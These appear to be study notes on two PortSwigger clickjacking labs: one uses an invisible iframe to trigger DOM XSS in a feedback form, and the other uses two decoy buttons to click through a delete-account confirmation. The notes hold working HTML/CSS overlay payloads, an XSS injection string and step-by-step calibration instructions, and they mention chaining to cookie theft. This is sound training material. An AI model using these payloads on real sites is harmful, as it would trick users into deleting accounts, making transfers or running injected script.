# Clickjacking - Advanced: DOM XSS trigger and multistep attacks

Two advanced patterns: (1) iframe src pre-loads XSS payload in URL params - victim's click submits the form, triggering DOM-based XSS in the page; (2) two-click confirmation flows need two aligned decoy divs to handle both the action and the confirmation dialog.

## Quick reference
```html
<!-- DOM XSS via clickjacking: prefill XSS in feedback name param -->
<iframe src="https://LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=x@x.com&subject=x&message=x#feedbackResult"></iframe>
<!-- victim clicks decoy -> form submits -> XSS triggers in DOM -->

<!-- Multistep: two divs, one per confirmation step -->
<style>
iframe { position:relative; width:500px; height:700px; opacity:0.0001; z-index:2; }
.firstClick  { position:absolute; top:330px; left:50px;  z-index:1; }
.secondClick { position:absolute; top:285px; left:225px; z-index:1; }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://LAB-ID.web-security-academy.net/my-account"></iframe>
```

## Root cause
- **DOM XSS:** the iframe pre-populates form fields with an XSS payload via URL params; when the victim clicks the "Submit" button (thinking it's the decoy), the form submits the XSS payload to a DOM sink in the page (e.g., `innerHTML` of `#feedbackResult`).
- **Multistep:** action requires confirmation (delete -> "Are you sure? Yes/No"). Two decoy divs aligned to each button, positioned sequentially - first click triggers the primary button, second click hits the confirmation.

## Find it
**DOM XSS via clickjacking:**
- Find a page with a form that reflects input into the DOM on submit (feedback, search, comment).
- Prefill the XSS payload in URL params -> load in iframe -> one click triggers XSS.

**Multistep:**
- Find delete/transfer actions that show a confirmation dialog.
- Two-step: "Delete account" -> confirmation page with "Yes" button.
- Two positioned decoys needed.

## Technique
**DOM XSS clickjack:**
1. Find XSS in a form param (e.g., `/feedback?name=<img src=1 onerror=print()>`).
2. Iframe src = URL with XSS in name param + `#feedbackResult` anchor (triggers DOM update on load/submit).
3. Align decoy div with "Submit feedback" button.
4. When victim clicks -> form submits -> XSS executes in victim's browser.

**Multistep:**
1. Calibrate first div over "Delete account" button - note position.
2. Click "Test me first" -> page transitions to confirmation.
3. Calibrate second div over "Yes" confirmation button.
4. Change texts to "Click me first" / "Click me next" -> deliver.

## Payload arsenal
```html
<!-- DOM XSS clickjack (calibration) -->
<style>
iframe { position:relative; width:500px; height:700px; opacity:0.1; z-index:2; }
div { position:absolute; top:610px; left:80px; z-index:1; }
</style>
<div>Test me</div>
<iframe src="https://LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=x@x.com&subject=x&message=x#feedbackResult"></iframe>

<!-- Multistep (calibration) -->
<style>
iframe { position:relative; width:500px; height:700px; opacity:0.1; z-index:2; }
.firstClick  { position:absolute; top:330px; left:50px;  z-index:1; }
.secondClick { position:absolute; top:285px; left:225px; z-index:1; }
</style>
<div class="firstClick">Test me first</div>
<div class="secondClick">Test me next</div>
<iframe src="https://LAB-ID.web-security-academy.net/my-account"></iframe>
```

## Bypasses
| Defense | Bypass |
|---|---|
| Confirmation dialog prevents one-click | Multistep: two aligned divs |
| DOM XSS requires specific trigger | Pre-fill in URL + click submits form -> DOM update |

## Exploitation walkthrough
**DOM XSS:**
1. Confirm XSS in feedback name param (loads via `#feedbackResult`).
2. iframe src = `/feedback?name=<img src=1 onerror=print()>&email=x@x.com&subject=x&message=x#feedbackResult`.
3. Align div at ~top:610px left:80px over "Submit feedback".
4. Opacity 0.0001, text "Click me" -> deliver -> print() fires in victim's browser.

**Multistep:**
1. Calibrate first div at ~top:330px left:50px (over "Delete account").
2. Click "Test me first" -> confirmation page appears.
3. Calibrate second div at ~top:285px left:225px (over "Yes" button).
4. Verify both alignments -> change texts to "Click me first/next" -> deliver -> account deleted.

## Chaining
- DOM XSS via clickjack -> steal cookies/tokens -> [XSS](../../XSS/) escalation
- Multistep -> any two-step confirmed action: bank transfer, privileged operation

## Tools
- **Exploit server** - calibrate positions visually; preview with opacity 0.1

## Labs

### Exploiting clickjacking vulnerability to trigger DOM-based XSS [Practitioner]
Feedback form with DOM XSS in name param. iframe pre-fills XSS payload in URL. Victim clicks "Submit feedback" -> XSS triggers (`print()` executes). Key insight: clickjacking can be a delivery mechanism for DOM XSS - combining UI redress with client-side injection.

### Multistep clickjacking [Practitioner]
Delete account requires confirmation ("Yes"). Two decoy divs: first over "Delete account" (~330px,50px), second over "Yes" (~285px,225px). Victim clicks twice -> account deleted. Key insight: two-step confirmation dialogs require two aligned decoys but are still clickjackable.

## Real-world notes
- DOM XSS + clickjacking bypasses stored XSS filters because the payload is never stored - it lives only in the URL.
- Multi-step clickjacking is relevant for any high-value confirmation flow (payment, deletion, privilege change).

## References
- https://portswigger.net/web-security/clickjacking
